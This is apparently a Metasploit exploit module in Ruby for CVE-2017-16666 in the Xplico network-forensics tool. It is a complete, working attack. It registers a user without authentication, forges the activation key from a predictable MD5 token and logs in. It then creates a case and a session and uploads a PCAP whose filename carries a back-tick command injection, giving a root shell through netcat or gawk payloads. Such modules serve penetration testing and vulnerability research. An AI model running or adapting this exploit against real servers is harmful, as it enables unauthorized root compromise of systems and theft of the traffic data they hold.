# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Xplico Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal
        command under the context of the root user.

        The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet
        traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create
        a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try
        to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation.
        But it&#039;s possible to calculate exactly same token value because of insecure cryptographic random string generator function usage.

        One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum
        of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039;  # author & msf module
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2017-16666&#039;],
          [&#039;URL&#039;, &#039;https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/&#039;],
          [&#039;URL&#039;, &#039;https://www.xplico.org/archives/1538&#039;]
        ],
      &#039;Privileged&#039;      => true,
      &#039;Platform&#039;        => [&#039;unix&#039;],
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;DefaultOptions&#039;  =>
        {
          &#039;RPORT&#039; => 9876
        },
      &#039;Payload&#039; =>
        {
          &#039;Space&#039;       => 252,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039; => "\x2f\x22",
          &#039;Compat&#039; =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic netcat gawk&#039;, # other cmd payloads can&#039;t fit within 252 space due to badchars.
            },
        },
      &#039;Targets&#039;         => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039;  => &#039;Oct 29 2017&#039;,
      &#039;DefaultTarget&#039;   => 0
    ))

  end

  def check
    # There is no exact way to understand validity of vulnerability without registering new user as well as trigger the command injection.
    # which is not something we want to do for only check..!
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;users&#039;, &#039;register&#039;),
    )
    if res && res.code == 302
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Unknown
    end
  end

  def initiate_session
    print_status(&#039;Initiating new session on server side&#039;)
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;users&#039;, &#039;login&#039;),
    )
    if res && res.code == 200
      res.get_cookies
    else
      nil
    end

  end

  def register_user(username, password)
    # First thing first, we need to get csrf token from registration form.
    print_status(&#039;Registering a new user&#039;)

    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;users&#039;, &#039;register&#039;),
      &#039;cookie&#039; => @cookie
    )

    if res && res.code == 200
      csrf_token = res.get_hidden_inputs.first[&#039;data[_Token][key]&#039;] || nil
      fields = res.get_hidden_inputs.first[&#039;data[_Token][fields]&#039;] || nil
    end

    if csrf_token.nil? || fields.nil?
      fail_with(Failure::Unknown, &#039;Unable to extact hidden fields from registration form.&#039;)
    end

    # rand_mail_address sometimes generates buggy email address for this app. So we manually generate email address in here.
    email = &#039;&#039;
    email << rand_text_alpha_lower(rand(10)+4)
    email << &#039;@&#039;
    email << rand_text_alpha_lower(rand(10)+4)
    email << &#039;.&#039;
    email << rand_text_alpha_lower(rand(1)+2)

    # Create user
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;users&#039;, &#039;register&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        &#039;_method&#039; => &#039;POST&#039;,
        &#039;data[_Token][key]&#039; => csrf_token,
        &#039;data[User][email]&#039; => email,
        &#039;data[User][username]&#039; => username,
        &#039;data[User][password]&#039; => password,
        &#039;data[_Token][fields]&#039; => fields,
        &#039;data[_Token][unlocked]&#039; => &#039;&#039;,
      }
    )

    if res && res.code == 302
      print_good(&#039;New user successfully registered&#039;)
      print_status("Username: #{username}")
      print_status("Password: #{password}")
    else
      fail_with(Failure::Unknown, &#039;Could not register new user&#039;)
    end

    # Awesome. We have user. We need to activate it manually..!
    print_status(&#039;Calculating em_key code of the user&#039;)

    unixtime = Time.parse(res.headers[&#039;Date&#039;]).to_i
    password_md5 = Rex::Text.md5(password)
    em_key = Rex::Text.md5(
      "#{email}#{password_md5}#{unixtime}"
    )
    print_status("Activating user with em_key = #{em_key}")

    # We need to follow redirections. Even if we managed to find em_key.
    # It will redirect us to the login form. We need to see registration completed on final page.
    res = send_request_cgi!(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;users&#039;, &#039;registerConfirm&#039;, em_key),
      &#039;cookie&#039; => @cookie
    )

    if res && res.code == 200 && res.body.include?(&#039;Registration Completed.&#039;)
      print_good(&#039;User successfully activated&#039;)
    else
      fail_with(Failure::Unknown, &#039;Could not activated our user. Target may not be vulnerable.&#039;)
    end
  end

  def login(username, password)
    # yet another csrf token gathering.
    print_status(&#039;Authenticating with our activated new user&#039;)
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;users&#039;, &#039;login&#039;),
      &#039;cookie&#039; => @cookie
    )

    if res && res.code == 200
      csrf_token = res.get_hidden_inputs.first[&#039;data[_Token][key]&#039;] || nil
      fields = res.get_hidden_inputs.first[&#039;data[_Token][fields]&#039;] || nil
    end

    if csrf_token.nil? || fields.nil?
      fail_with(Failure::Unknown, &#039;Unable to extact hidden fields from login form.&#039;)
    end

    res = send_request_cgi!(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;users&#039;, &#039;login&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        &#039;_method&#039; => &#039;POST&#039;,
        &#039;data[_Token][key]&#039; => csrf_token,
        &#039;data[User][username]&#039; => username,
        &#039;data[User][password]&#039; => password,
        &#039;data[_Token][fields]&#039; => fields,
        &#039;data[_Token][unlocked]&#039; => &#039;&#039;,
      }
    )

    if res && res.body.include?(&#039;<a href="/pols">Cases</a>&#039;)
      print_good(&#039;Successfully authenticated&#039;)
    else
      fail_with(Failure::Unknown, &#039;Unable to login.&#039;)
    end

  end

  def create_new_case
    # We logged in. Not we need to create a new xplico case.
    print_status(&#039;Creating new case&#039;)
    pol_name = rand_text_alpha_lower(rand(4)+8)
    res = send_request_cgi!(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;pols&#039;, &#039;add&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        &#039;_method&#039; => &#039;POST&#039;,
        &#039;data[Capture][Type]&#039; => 0,
        &#039;data[Pol][name]&#039; => pol_name,
        &#039;data[Pol][external_ref]&#039; => &#039;&#039;,
      }
    )

    if res && res.body.include?(&#039;The Case has been created&#039;)
      res.body.scan(/<a href="\/pols\/view\/([0-9]+)">/).flatten[0]
    else
      nil
    end
  end

  def create_new_sol(pol_id)
    # Since we xplico case, it&#039;s time to create a "session" for this case.
    print_status(&#039;Creating new xplico session for pcap&#039;)

    sol_name = rand_text_alpha_lower(rand(4)+8)
    # sols/add endpoint reads selected case id through session.
    # So we need to hit that end-point so we can insert pol_id into the current session data.
    send_request_cgi!(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;pols&#039;, &#039;view&#039;, pol_id),
      &#039;cookie&#039; => @cookie,
    )

    # Creating new session.
    res = send_request_cgi!(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;sols&#039;, &#039;add&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        &#039;_method&#039; => &#039;POST&#039;,
        &#039;data[Sol][name]&#039; => sol_name,
      }
    )

    if res && res.body.include?(&#039;The Session has been created&#039;)
      res.body.scan(/<a href="\/sols\/view\/([0-9]+)">/).flatten[0]
    else
      nil
    end

  end

  def upload_pcap(sol_id)
    print_status(&#039;Uploading malformed PCAP file&#039;)
    # We are hitting this end-point so we can access sol_id through session on server-side.
    send_request_cgi!(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;sols&#039;, &#039;view&#039;, sol_id),
      &#039;cookie&#039; => @cookie,
    )

    # Reading malformed pcap files.
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2017-16666&#039;, &#039;dump.pcap&#039;)
    fd = ::File.open( path, &#039;rb&#039;)
    pcap = fd.read(fd.stat.size)
    fd.close

    data = Rex::MIME::Message.new
    data.add_part(&#039;POST&#039;, nil, nil, &#039;form-data; name="_method"&#039;)
    data.add_part(pcap, &#039;application/octet-stream&#039;, nil, "form-data; name=\"data[Sols][File]\"; filename=\"`#{payload.encoded})`\"") # Yes back-tick injection!

    # Uploading PCAP file.
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;sols&#039;, &#039;pcap&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;     => data.to_s
    )

    if res && res.code == 302
      print_good(&#039;PCAP successfully uploaded. Pcap parser is going to start on server side.&#039;)
    end

    # We can not wait all the day long to have session.
    # So we are checking status of decoding process 5 times with sleep for a 1 second on each loop.
    is_job_done = nil
    counter = 0
    until session_created? || !is_job_done.nil? || counter == 5
      res = send_request_cgi(
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;sols&#039;, &#039;view&#039;, sol_id),
        &#039;cookie&#039; => @cookie,
      )
      if res && res.body.include?(&#039;File uploaded, wait start decoding...&#039;)
        print_status(&#039;Parsing has started. Wait for parser to get the job done...&#039;)
      end
      if res && res.body.include?(&#039;DECODING&#039;)
        print_good(&#039;We are at PCAP decoding phase. Little bit more patience...&#039;)
      end
      # Tbh decoding process is not going to be finished as long as we have msf session.
      # We are not going to see this case if we are successful exploiting.
      if res && res.body.include?(&#039;DECODING COMPLETED&#039;)
        print_warning(&#039;PCAP parsing process has finished. Haven\&#039;t you got your shell ?&#039;)
        is_job_done = 1
        next
      end
      sleep(1)
      counter += 1
    end

  end

  def exploit

    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "#{peer} - Target not vulnerable")
    end

    # We need to access cookie from everywhere. Thus making it global variable.
    @cookie = initiate_session
    if @cookie.nil?
      fail_with(Failure::Unknown, &#039;Unable to initiate new sessionid on server.&#039;)
    end

    # We only need to access username and password for login func. Let&#039;s leave them as a local variables.
    password = rand_text_alpha(32)
    username = rand_text_alpha_lower(rand(8)+8)
    register_user(username, password)
    login(username, password)

    # We will need to have pol_id for creating new xplico session.
    pol_id = create_new_case
    if pol_id.nil?
      fail_with(Failure::Unknown, &#039;Unable to create New Case.&#039;)
    end
    print_good("New Case successfully creted. Our pol_id = #{pol_id}")

    # Create xplico session by using pol_id
    sol_id = create_new_sol(pol_id)
    if sol_id.nil?
      fail_with(Failure::Unknown, &#039;Unable to create New Sol.&#039;)
    end
    print_good("New Sols successfully creted. Our sol_id = #{sol_id}")

    # Uploading malformed PCAP file. We are exploiting authenticated cmd inj in here.
    upload_pcap(sol_id)

  end
end

